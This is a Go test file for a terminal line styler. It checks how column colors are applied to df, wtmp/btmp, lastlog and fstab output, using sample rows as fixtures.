// df's header ends in the two-word "Mounted on": the capture-group header
// regex keeps it one column, so data rows line up and the mount point (the
// last column) stays plain.
func TestDfHeaderAnchorsMultiWordLastColumn(t *testing.T) {
	styler := newLineStyler("df")
	header := "Filesystem      Size  Used Avail Use% Mounted on"
	if spans := styler(header); spans != nil {
		t.Fatalf("the header should only record anchors: %v", spans)
	}
	row := "/dev/vda1        40G   15G   25G  38% /"
	spans := styler(row)
	painted := paintLine(row, spans)
	for i, want := range []string{"40G", "15G", "25G", "38%"} {
		if !strings.Contains(painted, tableColumnStyles[i+1].seq().Render(want)) {
			t.Fatalf("column %d should have its column color (%q): %q", i+1, want, plain(painted))
		}
	}
	for _, span := range spans {
		if span.Start <= len(row)-1 && span.End > len(row)-1 {
			t.Fatalf("the mount point (last column) should stay plain: %+v", spans)
		}
	}
}

// The accounting store's closing line is a remark about the file — where its
// records begin, or that it holds none — not a row of it: the word-by-word
// cycle would paint its parts, so the table styler leaves it plain.
func TestTableStylerLeavesTheStoreTrailerPlain(t *testing.T) {
	styler := newLineStyler("table")
	for _, line := range []string{
		"/var/log/btmp has no entries",
		"btmp begins Mon Oct  5 09:12:00 2026",
		"wtmp begins Mon Oct  5 22:04:11 2026",
		"wtmpdb begins Mon Oct  5 22:04:11 2026",
	} {
		if spans := styler(line); spans != nil {
			t.Fatalf("%q should stay plain: %+v", line, spans)
		}
	}
	row := "root     ssh          117.67.231.246   Mon Oct  5 22:04 - still logged in"
	if spans := styler(row); len(spans) == 0 {
		t.Fatal("a session row should still get column colors")
	}
}

// lastlog's header is mixed case, so the all-caps header test does not
// recognize it: the check declares its own syntax, which anchors the columns on
// the header and leaves the note line printed ahead of it plain — the
// word-by-word cycle is for headerless tables only. The two rows are the tool's
// own output, "Latest" included, one column right of the timestamps below it.
func TestLastlogStylerAnchorsOnItsHeader(t *testing.T) {
	styler := newLineStyler("lastlog")
	note := "note: /var/lib/lastlog/lastlog2.db present, /var/log/lastlog is frozen"
	if spans := styler(note); spans != nil {
		t.Fatalf("a note ahead of the header should stay plain: %v", spans)
	}
	header := "Username         Port     From                                       Latest"
	if spans := styler(header); spans != nil {
		t.Fatalf("the header should only record anchors: %v", spans)
	}
	row := "root             pts/0    117.67.231.246                            Mon Oct  5 20:01:48 +0800 2026"
	spans := styler(row)
	painted := paintLine(row, spans)
	for i, want := range []string{"root", "pts/0", "117.67.231.246"} {
		if !strings.Contains(painted, tableColumnStyles[i].seq().Render(want)) {
			t.Fatalf("column %d should have its column color (%q): %q", i, want, plain(painted))
		}
	}
	latest := strings.Index(row, "Mon")
	for _, span := range spans {
		if span.Start >= latest {
			t.Fatalf("the timestamp column should stay plain: %+v", spans)
		}
	}
}

// fstab rows are colored by column: device blue, mount point green, filesystem
// type magenta, options default, dump and pass dimmed; comments stay with the
// reader's comment muting.
func TestFstabColumns(t *testing.T) {
	styler := newLineStyler("fstab")
	if spans := styler("# <file system> <mount point> <type> <options> <dump> <pass>"); spans != nil {
		t.Fatalf("a comment should not be painted here: %v", spans)
	}
	row := "UUID=1a2b  /  ext4  errors=remount-ro  0  1"
	painted := paintLine(row, styler(row))
	if !strings.Contains(painted, style{fg: "4"}.seq().Render("UUID=1a2b")) {
		t.Fatalf("the device should be blue: %q", plain(painted))
	}
	if !strings.Contains(painted, style{fg: "2"}.seq().Render("/")) {
		t.Fatalf("the mount point should be green: %q", plain(painted))
	}
	if !strings.Contains(painted, style{fg: "5"}.seq().Render("ext4")) {
		t.Fatalf("the filesystem type should be magenta: %q", plain(painted))
	}
	if !strings.Contains(painted, dimStyle.seq().Render("0")) ||
		!strings.Contains(painted, dimStyle.seq().Render("1")) {
		t.Fatalf("dump and pass should be dimmed: %q", plain(painted))
	}
	if at := strings.Index(row, "errors=remount-ro"); at >= 0 {
		for _, span := range styler(row) {
			if span.Start <= at && span.End >= at+len("errors=remount-ro") {
				t.Fatalf("options should stay default: %+v", span)
			}
		}
	}
}
